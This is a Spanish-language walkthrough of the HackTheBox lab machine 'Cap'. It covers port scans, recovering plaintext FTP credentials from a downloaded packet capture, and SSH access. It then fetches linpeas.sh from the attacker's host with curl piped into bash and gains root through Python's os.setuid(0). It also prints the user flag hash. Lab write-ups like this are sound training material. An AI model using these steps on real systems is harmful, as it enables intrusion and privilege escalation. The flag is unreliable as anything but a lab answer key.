---
title: "HackTheBox - Machine Cap"
summary: "Vamos a ver el paso a paso detallado de como ir resolviendo la maquina:"
date: "2025-03-29"
draft: false
tags:
- Tutorial
- HackTheBox
- Machines
---

### Paso a paso:

<div style="height: 5px;"></div>

- Luego de conectar nuestra VPN y encender la maquina. Vamos a realizar un ping 
    hacia la direccion ip de la maquin atacada para poder corroborar que tenemos
    conexión:
```js
❯ ping -c1 10.10.10.245
PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
64 bytes from 10.10.10.245: icmp_seq=l t t 1=63 time=191 ms
--- 10.10.10.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time Oms
rtt min/avg/max/mdev = 190.526/190.526/190.526/0.000 ms
```

<div style="height: 5px;"></div>

- Como el TTL es 63 podríamos decir que es una maquina Linux ya que:
![Test Relative Image](./imagen2.png)

<div style="height: 5px;"></div>

- Hago dos análisis de puertos para ver que puertos estan abiertos. El primero 
    es algo mas sigiloso solamente para ver cuales estan abiertos:
```js
❯ cat allPorts
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.10.10.245 ()   Status: Up
   4   │ Host: 10.10.10.245 ()   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
   5   │ # Nmap done at Tue Mar  4 19:18:09 2025 -- 1 IP address (1 host up) scanned in 25.62 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

<div style="height: 5px;"></div>

- Y el segundo es mas agresivo para ver las versiones:
```js
❯ cat targeted
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # nmap -sCV -p21,22,80 -oN targeted 10.10.10.245
   2   │ Nmap scan report for 10.10.10.245
   3   │ Host is up (1.5s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.3
   7   │ 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
  10   │ |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
  11   │ |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
  12   │ 80/tcp open  http    gunicorn
  13   │ |_http-server-header: gunicorn
  14   │ |_http-title: Security Dashboard
  15   │ | fingerprint-strings: 
  16   │ |   GetRequest: 
  17   │ |     HTTP/1.0 200 OK
  18   │ |     Server: gunicorn
  19   │ |     Date: Tue, 04 Mar 2025 22:25:39 GMT
  20   │ |     Connection: close
  21   │ |     Content-Type: text/html; charset=utf-8
  22   │ |     Content-Length: 19386
  23   │ |     <!DOCTYPE html>
  24   │ |     <html class="no-js" lang="en">
  25   │ |     <head>
  26   │ |     <meta charset="utf-8">
  27   │ |     <meta http-equiv="x-ua-compatible" content="ie=edge">
  28   │ |     <title>Security Dashboard</title>
  29   │ |     <meta name="viewport" content="width=device-width, initial-scale=1">
  30   │ |     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
  31   │ |     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
  32   │ |     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
  33   │ |     <link rel="stylesheet" href="/static/css/themify-icons.css">
  34   │ |     <link rel="stylesheet" href="/static/css/metisMenu.css">
  35   │ |     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
  36   │ |     <link rel="stylesheet" href="/static/css/slicknav.min.css">
  37   │ |     <!-- amchar
  38   │ |   HTTPOptions: 
  39   │ |     HTTP/1.0 200 OK
  40   │ |     Server: gunicorn
  41   │ |     Date: Tue, 04 Mar 2025 22:25:40 GMT
  42   │ |     Connection: close
  43   │ |     Content-Type: text/html; charset=utf-8
  44   │ |     Allow: OPTIONS, GET, HEAD
  45   │ |_    Content-Length: 0
  46   │ 1 service unrecognized despite returning data. If you know the service/version, please submit 
       │   the following fingerprint at https://nmap.org/cgi-bin/submit.
       │ cgi?new-service :
  47   │ SF-Port80-TCP:V=7.94SVN%I=7%D=3/4%Time=67C77D6D%P=x86_64-pc-linux-gnu%r(Ge
  48   │ SF:tRequest,2A0C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
  49   │ SF:20Tue,\x2004\x20Mar\x202025\x2022:25:39\x20GMT\r\nConnection:\x20close\
  50   │ SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
  51   │ SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
  52   │ SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
  53   │ SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
  54   │ SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
  55   │ SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
  56   │ SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
  57   │ SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
  58   │ SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
  59   │ SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
  60   │ SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
  61   │ SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
  62   │ SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
  63   │ SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
  64   │ SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
  65   │ SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
  66   │ SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,\
  67   │ SF:x2004\x20Mar\x202025\x2022:25:40\x20GMT\r\nConnection:\x20close\r\nCont
  68   │ SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\
  69   │ SF:x20HEAD\r\nContent-Length:\x200\r\n\r\n");
  70   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  71   │ 
  72   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  73   │ # Nmap done at Tue Mar  4 19:24:50 2025 -- 1 IP address (1 host up) scanned in 83.82 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────
```

<div style="height: 5px;"></div>

- Hago un análisis de la web:
```js
❯ cat webScan
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: webScan
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # nmap --script http-enum -p80 -oN webScan 10.10.10.245
   2   │ Nmap scan report for 10.10.10.245
   3   │ Host is up (1.7s latency).
   4   │ 
   5   │ PORT   STATE SERVICE
   6   │ 80/tcp open  http
   7   │ 
   8   │ # Nmap done at Tue Mar  4 19:36:51 2025 -- 1 IP address (1 host up) scanned in 106.72 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

<div style="height: 5px;"></div>

- Entramos a la ip a través de Firefox y seguramente nos entre a /data/o pero 
    por las dudas revisamos y sino ponemos 0 en data en la url:
![Test Relative Image](./imagen7.png)

<div style="height: 5px;"></div>

- Descargamos el reporte.

<div style="height: 5px;"></div>

- En la terminal lo movemos a la dirección donde estamos trabajando:
```bash
❯ mv /home/joaquin/Descargas/0.pcap .
❯ ls
 0.pcap   2.pcap
```

<div style="height: 5px;"></div>

- Lo abrimos:
```bash
❯ tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

<div style="height: 5px;"></div>

- Observamos que hay un usuario y contraseña:
```bash
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your 
spelling and try again.</p>
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

<div style="height: 5px;"></div>

- Hago un ftp para establecer una conexion con el servidor a traves del usuario 
    que descubrimos y la contrasena:
![Test Relative Image](./imagen11.png)

<div style="height: 5px;"></div>

- Descargo el user.txt:
![Test Relative Image](./imagen12.png)

<div style="height: 5px;"></div>

- Dentro del Archivo encontramos en hash del user:
```bash
❯ cat user.txt
───────┬─────────────────────────────────
       │ File: user.txt
───────┼─────────────────────────────────
   1   │ 8a217d80d767aa5489d69a33ed4af1e2
───────┴─────────────────────────────────
```

<div style="height: 5px;"></div>

- Ahora ingreso por ssh al dispositivo:
```bash
ssh nathan@10.10.10.245
```

<div style="height: 5px;"></div>

- Busco linpeas.sh para encontrar un exploit que me permita escalar privilegios:
![Test Relative Image](./imagen15.png)

<div style="height: 5px;"></div>

- Descargo:
![Test Relative Image](./imagen16.png)

<div style="height: 5px;"></div>

- Lo pego en mi terminal:
![Test Relative Image](./imagen17.png)

<div style="height: 5px;"></div>

- Envio por curl una copia del archivo:
![Test Relative Image](./imagen18.png)

<div style="height: 5px;"></div>

- Despues lo ejecuto remotamente:
```bash
nathan@cap:~$ curl http://10. 10.14.19/linpeas.sh
```

<div style="height: 5px;"></div>

- Espero a que se active correctamente:
```bash
nathan@cap:~$ curl http://10. 10.14.19/linpeas.sh | bash
```

<div style="height: 5px;"></div>

- Ejecuto un python3:
```bash
nathan@cap:~$ /usr/bin/python3.8
```

<div style="height: 5px;"></div>

- Ejecuto:
```bash
>>> os.setuid(0)
```

<div style="height: 5px;"></div>

- Ejecuto:
```bash
>>> os.system("/bin/bash")
```

<div style="height: 5px;"></div>

- Y finalmente:
![Test Relative Image](./imagen24.png)














